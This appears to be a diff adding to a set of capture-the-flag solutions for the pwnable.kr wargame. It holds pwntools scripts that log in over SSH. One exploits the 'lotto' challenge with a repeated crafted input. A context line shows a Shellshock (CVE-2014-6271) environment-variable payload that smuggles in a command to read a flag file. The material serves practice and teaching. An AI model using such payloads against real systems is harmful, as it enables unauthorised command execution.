@@ -229,3 +229,34 @@ vm = ssh("shellshock", "pwnable.kr", 2222, "guest")
 payload = "env CVE_2014_6271='() { :;}; /bin/cat /home/shellshock/flag' /home/shellshock/shellshock"
 print(vm.process(["/bin/bash", "-c", payload]).recvall())
 ```
+
+## lotto
+
+#### Solution
+```python
+from pwn import *
+
+def read_lines(p, i, decode=True):
+    line = ""
+    for _ in range(i):
+        line = p.recvline()
+    if decode:
+        return line.decode("utf-8", errors='replace')
+    else:
+        return line
+    
+
+vm = ssh("lotto", "pwnable.kr", 2222, "guest")
+lotto_in = "%%%%%%"
+
+p = vm.process("./lotto")
+
+while True:
+    read_lines(p, 4)
+    p.sendline("1")
+    p.sendline(lotto_in)
+    result = read_lines(p, 2)
+    if "bad luck" not in result:
+        print(result, end='')
+        break
+```
